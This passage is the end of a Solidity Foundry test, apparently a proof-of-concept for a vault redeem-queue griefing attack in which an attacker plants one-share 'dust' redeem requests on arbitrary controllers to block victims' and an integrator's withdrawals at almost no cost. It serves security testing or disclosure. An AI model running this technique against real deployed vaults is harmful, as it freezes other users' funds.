        assertEq(juniorVault.maxRedeem(VICTIM), 0, "blocked again");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "blocked again");
        vm.prank(VICTIM);
        vm.expectRevert(
            abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, VICTIM, victimClaimShares2, 0)
        );
        juniorVault.redeem(victimClaimShares2, VICTIM, VICTIM);

        // Attacker's total spend: one share per plant (23 plants), worth zero USDG (< 1 USDG atom) plus gas.
        uint256 spentShares = attackerSharesBefore - juniorVault.balanceOf(ATTACKER);
        assertEq(spentShares, EXTRA_TARGETS + 3);
        assertEq(juniorVault.convertToAssets(spentShares), 0, "attack costs < 1 USDG atom plus gas");
        console2.log("victim USDG blocked from standard claim (round 1)", victimClaimAssets);
        console2.log("integrator USDG stuck behind planted head", integratorClaimAssets);
        console2.log("attacker shares spent in total", spentShares);
    }

    //------------------------------ helpers ----------------------------

    /// @dev Plants one attacker-made redeem request on `controller`:
    ///      1. The attacker tops up its throw-away account D with exactly 1 share. D inherits the attacker's elapsed
    ///         cooldown through `TrancheVault._update`, so it can request immediately.
    ///      2. D calls `requestRedeem(1, controller, D)`. This redeems D's whole balance, so the 1 USDG minimum is
    ///         waived and `maxRequestRedeem(D) == 1`.
    ///      `controller` takes no action and gives no approval. Gas per plant: ~25k (transfer) + ~160k (request).
    function _plantDust(
        address controller
    ) internal returns (uint256 requestId) {
        vm.prank(ATTACKER);
        juniorVault.transfer(DUST, 1);
        assertEq(juniorVault.maxRequestRedeem(DUST), 1, "full-balance dust request admitted");
        vm.prank(DUST);
        requestId = juniorVault.requestRedeem(1, controller, DUST);
    }

    /// @dev Warps to the epoch's maturity, refreshes the engine mark (router-only call, pranked as the router) and runs
    ///      one ordinary LP-epoch settlement through the `BasePerpTest` helper, as a keeper would.
    function _settle(
        uint256 epochId
    ) internal returns (IHousePool.LpEpochSettlementResult memory result) {
        uint256 maturity = pool.lpEpochStart(epochId);
        if (block.timestamp < maturity) {
            vm.warp(maturity);
        }
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, uint64(block.timestamp));
        result = _settleLpEpochForTest();
    }

    /// @dev Deterministic arbitrary controller addresses that never touched the vault (shows any address works).
    function _target(
        uint256 i
    ) internal pure returns (address) {
        return address(uint160(0xC0DE0000 + i));
    }

}

```
